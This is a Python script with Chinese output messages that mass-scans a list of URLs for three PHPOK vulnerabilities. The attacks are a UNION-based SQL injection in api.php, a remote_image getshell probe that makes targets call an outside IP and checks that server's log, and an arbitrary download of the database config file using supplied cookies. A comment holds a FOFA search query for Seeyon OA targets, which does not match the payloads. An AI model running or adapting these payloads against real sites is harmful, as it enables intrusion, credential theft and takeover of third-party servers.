
import json
import requests
import time
import hashlib
import datetime

#fofa：app="Yonyou-Seeyon-OA" && body="致远协创A6" && host!="gov.cn"

urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/api.php?c=api&f=phpok&id=_total&param[pid]=42&param[user_id]=0)UnIOn/**/sElEcT/**/mD5(1234)/**/LIMIT/**/1,1%23"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl,  timeout=10, verify=False)
        if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
            print("[+]存在phpok api.php SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('SQL注入漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在phpok_api_param_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    time_stamp = time.mktime(datetime.datetime.now().timetuple())
    m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
    md5_str = m.hexdigest()
    payload = "/index.php?c=ueditor&f=remote_image&upfile=http://45.76.158.91:6868/" + md5_str
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl,  timeout=10, verify=False)
        eye_url = "http://45.76.158.91/web.log"
        time.sleep(6)
        reqr = requests.get(eye_url,  timeout=10, verify=False)
        if md5_str in reqr.text:
            print("[+]存在phpok remote_image getshell漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('getshell漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在phpok_remote_image_getshell漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/admin.php?c=res_action&f=download&file=_config/db.ini.php"
    vulnurl = url + payload
    try:
        f = open(r'cookies.txt', 'r')
        cookies = {}
        for line in f.read().split(";"):
            name, value = line.strip().split("=", 1)
            cookies[name] = value
    except:
        pass
    try:
        req = requests.get(vulnurl,  cookies=cookies, timeout=10, verify=False)
        if r"<?php" in req.text and r"host" in req.text:
            print(
                "[+]存在phpok res_action_control.php 任意文件下载(需要cookies文件)漏洞...(高危)\tpayload: " + vulnurl + "\ncookies:" + json.dumps(
                    cookies, indent=4), "red")
            with open('任意文件下载.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在phpok_res_action_control_filedownload漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")